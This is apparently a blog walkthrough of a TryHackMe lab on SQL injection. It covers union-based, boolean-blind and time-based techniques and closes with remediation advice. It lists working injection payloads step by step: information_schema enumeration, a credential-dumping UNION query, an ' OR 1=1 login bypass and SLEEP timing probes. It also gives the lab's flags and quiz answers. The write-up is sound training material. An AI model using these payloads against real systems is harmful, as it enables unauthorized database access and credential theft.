---
title: SQL Injection
date: 2022-06-14 18:32:00 -0500
categories: [Lesson, Tutorial]
tags: [SQL Injection, TryHackMe]
---

Learn how to detect and exploit SQL Injection vulnerabilities

[https://tryhackme.com/room/sqlinjectionlm](https://tryhackme.com/room/sqlinjectionlm)

* * *

## Task 1 - Brief

SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.

In this room, you'll learn what databases are, what SQL is with some basic SQL commands, how to detect SQL vulnerabilities, how to exploit SQLi vulnerabilities and as a developer how you can protect yourself against SQL Injection.

**In-Band SQL Injection**

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


**Error-Based SQL Injection**

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


**Union-Based SQL Injection**

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

##   Answer the questions below

What does SQL stand for? Structured Query Language.

* * * 

## Task 2 - What is a Database?

##   Answer the questions below

What is the acronym for the software that controls a database? DBMS (Database Management Systems)

What is the name of the grid-like structure which holds the data? Table

* * * 

## Task 3 - What is SQL? 

##   Answer the questions below

What SQL statement is used to retrieve data? select

What SQL clause can be used to retrieve data from multiple tables? union

What SQL statement is used to add data? insert

* * * 

## Task 4 - What is SQL Injection? 

##   Answer the questions below

What character signifies the end of an SQL query? ``;``

* * *

## Task 5 - In-Band SQL

What is the flag after completing level 1? 

Finding this is a SQL query by getting an error message with ``` we can run the following commands to get the flag:

1. ``1 UNION SELECT 1``

2. ``1 UNION SELECT 1,2``

3. ``1 UNION SELECT 1,2,3``

4. ``0 UNION SELECT 1,2,3``

5. ``0 UNION SELECT 1,2,database()``

6. ``0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'``

7. ``0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'``

8. ``0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users``

THM{SQL_INJECTION_3840}

* * * 

##  Task 6 - Blind SQLi - Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 


Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.


**What is the flag after completing level two? (and moving to level 3)**

Using ``' OR 1=1;--`` We can get to the next level and recieve our flag which is THM{SQL_INJECTION_9581}

* * * 

##  Task 7 - Blind SQLi - Boolean Based 

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.

**What is the flag after completing level three?**

In order to get this flag we can use the same steps as previous with and proceed until

1. ``admin123' UNION SELECT 1;--``
2. ``admin123' UNION SELECT 1,2,3;-- ``
3. ``admin123' UNION SELECT 1,2,3 where database() like '%';--``
4. ``admin123' UNION SELECT 1,2,3 where database() like 's%';--`` we continue on with this until we find the name of the database which is sqli_three
5. ``admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--``
6. ``admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--``
7. ``admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`` Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload.
8. ``admin123' UNION SELECT 1,2,3 from users where username like 'a%``
9. ``admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`` Cycling through until we find the password which is 3845.

What is the level 3 flag? THM{SQL_INJECTION_1093}

* * * 

##  Task 8 - Blind SQLi - Time Based

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

So, for example, when trying to establish the number of columns in a table, you would use the following query:


``admin123' UNION SELECT SLEEP(5);--``


If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:


``admin123' UNION SELECT SLEEP(5),2;--``


This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.


You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.

If you're struggling to find the table name the below query should help you on your way:


``referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--``

THM{SQL_INJECTION_MASTER}

* * * 

##  Task 9 - Out-of-Band SQLi 

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

##   Answer the questions below

Name a protocol beginning with D that can be used to exfiltrate data from a database. DNS

* * *

##  Task 10 - Remediation 

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:

**Prepared Statements (With Parameterized Queries):**

In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.

**Input Validation:**

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 

**Escaping User Input:**

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.

##   Answer the questions below

Name a method of protecting yourself from an SQL Injection exploit.












